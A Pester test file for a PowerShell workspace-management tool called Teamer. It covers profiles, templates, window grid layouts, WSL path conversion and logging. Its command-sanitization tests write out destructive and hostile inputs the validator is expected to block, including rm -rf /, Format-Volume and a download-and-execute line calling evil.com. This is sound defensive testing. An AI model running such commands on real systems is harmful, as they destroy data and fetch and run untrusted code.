#Requires -Modules Pester

<#
.SYNOPSIS
    Pester tests for Teamer module
.DESCRIPTION
    Unit and integration tests for Teamer's core functionality
    Compatible with Pester 3.x and 5.x
#>

# Get the project root
$ProjectRoot = Split-Path -Parent $PSScriptRoot

# Load the module once at script level
. "$ProjectRoot\scripts\Manage-TeamerEnvironment.ps1"

Describe "Command Sanitization" {
    Context "Test-CommandSafe" {
        It "Should allow safe commands" {
            $result = Test-CommandSafe -Command "npm install"
            $result.IsValid | Should Be $true
        }

        It "Should allow docker commands" {
            $result = Test-CommandSafe -Command "docker-compose up -d"
            $result.IsValid | Should Be $true
        }

        It "Should allow git commands" {
            $result = Test-CommandSafe -Command "git status"
            $result.IsValid | Should Be $true
        }

        It "Should block recursive force delete" {
            $result = Test-CommandSafe -Command "Remove-Item C:\Users -Recurse -Force"
            $result.IsValid | Should Be $false
            $result.Reason | Should Match "blocked pattern"
        }

        It "Should block Unix rm -rf" {
            $result = Test-CommandSafe -Command "rm -rf /"
            $result.IsValid | Should Be $false
        }

        It "Should block Format-Volume" {
            $result = Test-CommandSafe -Command "Format-Volume -DriveLetter C"
            $result.IsValid | Should Be $false
        }

        It "Should block Stop-Computer" {
            $result = Test-CommandSafe -Command "Stop-Computer"
            $result.IsValid | Should Be $false
        }

        It "Should block Restart-Computer" {
            $result = Test-CommandSafe -Command "Restart-Computer -Force"
            $result.IsValid | Should Be $false
        }

        It "Should block download and execute patterns" {
            $result = Test-CommandSafe -Command "Invoke-WebRequest http://evil.com/script.ps1 | Invoke-Expression"
            $result.IsValid | Should Be $false
        }

        It "Should block elevation attempts" {
            $result = Test-CommandSafe -Command "Start-Process cmd -Verb RunAs"
            $result.IsValid | Should Be $false
        }

        It "Should reject empty commands" {
            $result = Test-CommandSafe -Command ""
            $result.IsValid | Should Be $false
            $result.Reason | Should Match "Empty"
        }

        It "Should reject whitespace-only commands" {
            $result = Test-CommandSafe -Command "   "
            $result.IsValid | Should Be $false
        }
    }
}

Describe "Profile Management" {
    Context "Get-TeamerProfile" {
        It "Should return a list when called without parameters" {
            $profiles = Get-TeamerProfile
            $profiles | Should Not BeNullOrEmpty
        }

        It "Should return profile config when called with name" {
            $profile = Get-TeamerProfile -Name "powershell"
            $profile | Should Not BeNullOrEmpty
            $profile.shell | Should Be "powershell"
        }

        It "Should return null for non-existent profile" {
            $profile = Get-TeamerProfile -Name "nonexistent-profile-12345"
            $profile | Should BeNullOrEmpty
        }
    }
}

Describe "Template Management" {
    Context "Get-TeamerTemplate" {
        It "Should return a list when called without parameters" {
            $templates = Get-TeamerTemplate
            $templates | Should Not BeNullOrEmpty
        }

        It "Should return template config when called with name" {
            $template = Get-TeamerTemplate -Name "base-dev"
            $template | Should Not BeNullOrEmpty
            $template.name | Should Not BeNullOrEmpty
        }

        It "Should return null for non-existent template" {
            $template = Get-TeamerTemplate -Name "nonexistent-template-12345"
            $template | Should BeNullOrEmpty
        }
    }
}

Describe "Layout Management" {
    Context "Get-TeamerLayout" {
        It "Should return a list when called without parameters" {
            $layouts = Get-TeamerLayout
            $layouts | Should Not BeNullOrEmpty
        }

        It "Should return layout config when called with name" {
            $layout = Get-TeamerLayout -Name "single-focus"
            $layout | Should Not BeNullOrEmpty
            $layout.name | Should Not BeNullOrEmpty
        }
    }
}

Describe "Grid Calculations" {
    Context "Get-TeamerScreenBounds" {
        It "Should return screen bounds with required properties" {
            $bounds = Get-TeamerScreenBounds
            $bounds | Should Not BeNullOrEmpty
            $bounds.Width | Should BeGreaterThan 0
            $bounds.Height | Should BeGreaterThan 0
        }
    }

    Context "Get-TeamerGridCellBounds" {
        It "Should calculate bounds for cell (0,0)" {
            $testGrid = @{
                rows = 2
                cols = 2
                gap = 4
                margin = 4
            }
            $bounds = Get-TeamerGridCellBounds -Grid $testGrid -Row 0 -Col 0
            $bounds | Should Not BeNullOrEmpty
            $bounds.Width | Should BeGreaterThan 0
            $bounds.Height | Should BeGreaterThan 0
        }

        It "Should calculate bounds for cell (1,1)" {
            $testGrid = @{
                rows = 2
                cols = 2
                gap = 4
                margin = 4
            }
            $bounds = Get-TeamerGridCellBounds -Grid $testGrid -Row 1 -Col 1
            $bounds | Should Not BeNullOrEmpty
            $bounds.Width | Should BeGreaterThan 0
            $bounds.Height | Should BeGreaterThan 0
        }

        It "Should handle row spans" {
            $testGrid = @{
                rows = 2
                cols = 2
                gap = 4
                margin = 4
            }
            $boundsNoSpan = Get-TeamerGridCellBounds -Grid $testGrid -Row 0 -Col 0 -RowSpan 1
            $boundsWithSpan = Get-TeamerGridCellBounds -Grid $testGrid -Row 0 -Col 0 -RowSpan 2

            $boundsWithSpan.Height | Should BeGreaterThan $boundsNoSpan.Height
        }

        It "Should handle column spans" {
            $testGrid = @{
                rows = 2
                cols = 2
                gap = 4
                margin = 4
            }
            $boundsNoSpan = Get-TeamerGridCellBounds -Grid $testGrid -Row 0 -Col 0 -ColSpan 1
            $boundsWithSpan = Get-TeamerGridCellBounds -Grid $testGrid -Row 0 -Col 0 -ColSpan 2

            $boundsWithSpan.Width | Should BeGreaterThan $boundsNoSpan.Width
        }

        It "Should respect gap parameter" {
            $gridWithGap = @{ rows = 2; cols = 2; gap = 10; margin = 0 }
            $gridNoGap = @{ rows = 2; cols = 2; gap = 0; margin = 0 }

            $boundsWithGap = Get-TeamerGridCellBounds -Grid $gridWithGap -Row 0 -Col 0
            $boundsNoGap = Get-TeamerGridCellBounds -Grid $gridNoGap -Row 0 -Col 0

            # Cell with gap should be smaller
            $boundsWithGap.Width | Should BeLessThan $boundsNoGap.Width
        }

        It "Should respect margin parameter" {
            $gridWithMargin = @{ rows = 1; cols = 1; gap = 0; margin = 20 }
            $gridNoMargin = @{ rows = 1; cols = 1; gap = 0; margin = 0 }

            $boundsWithMargin = Get-TeamerGridCellBounds -Grid $gridWithMargin -Row 0 -Col 0
            $boundsNoMargin = Get-TeamerGridCellBounds -Grid $gridNoMargin -Row 0 -Col 0

            # Cell with margin should be smaller
            $boundsWithMargin.Width | Should BeLessThan $boundsNoMargin.Width
        }
    }
}

Describe "WSL Path Conversion" {
    Context "Convert-ToWslPath" {
        It "Should convert Windows drive paths" {
            $result = Convert-ToWslPath -WindowsPath "C:\Users\Test\Project"
            $result | Should Be "/mnt/c/Users/Test/Project"
        }

        It "Should handle different drive letters" {
            $result = Convert-ToWslPath -WindowsPath "E:\Projects\teamer"
            $result | Should Be "/mnt/e/Projects/teamer"
        }

        It "Should convert backslashes to forward slashes" {
            $result = Convert-ToWslPath -WindowsPath "D:\path\to\file"
            $result | Should Not Match '\\'
            $result | Should Match '/'
        }

        It "Should handle paths without drive letters" {
            $result = Convert-ToWslPath -WindowsPath "\relative\path"
            $result | Should Be "/relative/path"
        }

        It "Should return null for empty input" {
            $result = Convert-ToWslPath -WindowsPath ""
            $result | Should BeNullOrEmpty
        }
    }
}

Describe "Logging" {
    Context "Write-TeamerLog" {
        It "Should not throw when logging" {
            { Write-TeamerLog -Message "Test message" -Level Info } | Should Not Throw
        }

        It "Should accept Warning level" {
            { Write-TeamerLog -Message "Warning test" -Level Warning } | Should Not Throw
        }

        It "Should accept Error level" {
            { Write-TeamerLog -Message "Error test" -Level Error } | Should Not Throw
        }
    }

    Context "Get-TeamerLog" {
        It "Should not throw when getting logs" {
            { Get-TeamerLog -Lines 10 } | Should Not Throw
        }
    }
}

Describe "Win32 Module" {
    Context "TeamerWin32 Type" {
        It "Should have TeamerWin32 type loaded" {
            $type = [System.Management.Automation.PSTypeName]'TeamerWin32'
            $type | Should Not BeNullOrEmpty
        }
    }

    Context "Get-TeamerWindowFrameOffset" {
        It "Should return frame offset hashtable" {
            # Use a known window handle (will return fallback values for invalid handle)
            $offset = Get-TeamerWindowFrameOffset -Handle ([IntPtr]::Zero)
            $offset | Should Not BeNullOrEmpty
            $offset.Left | Should Not BeNullOrEmpty
            $offset.Right | Should Not BeNullOrEmpty
            $offset.Top | Should Not BeNullOrEmpty
            $offset.Bottom | Should Not BeNullOrEmpty
        }

        It "Should have Source property" {
            $offset = Get-TeamerWindowFrameOffset -Handle ([IntPtr]::Zero)
            ($offset.Source -eq 'DWM' -or $offset.Source -eq 'Fallback') | Should Be $true
        }
    }
}

Describe "Desktop Protection" {
    Context "Test-DesktopProtected" {
        It "Should protect desktops named 'Main'" {
            $result = Test-DesktopProtected -Index 0 -Name "Main"
            $result | Should Be $true
        }

        It "Should protect desktops named 'Code'" {
            $result = Test-DesktopProtected -Index 0 -Name "Code"
            $result | Should Be $true
        }

        It "Should not protect custom named desktops" {
            $result = Test-DesktopProtected -Index 999 -Name "MyCustomDesktop"
            $result | Should Be $false
        }
    }
}
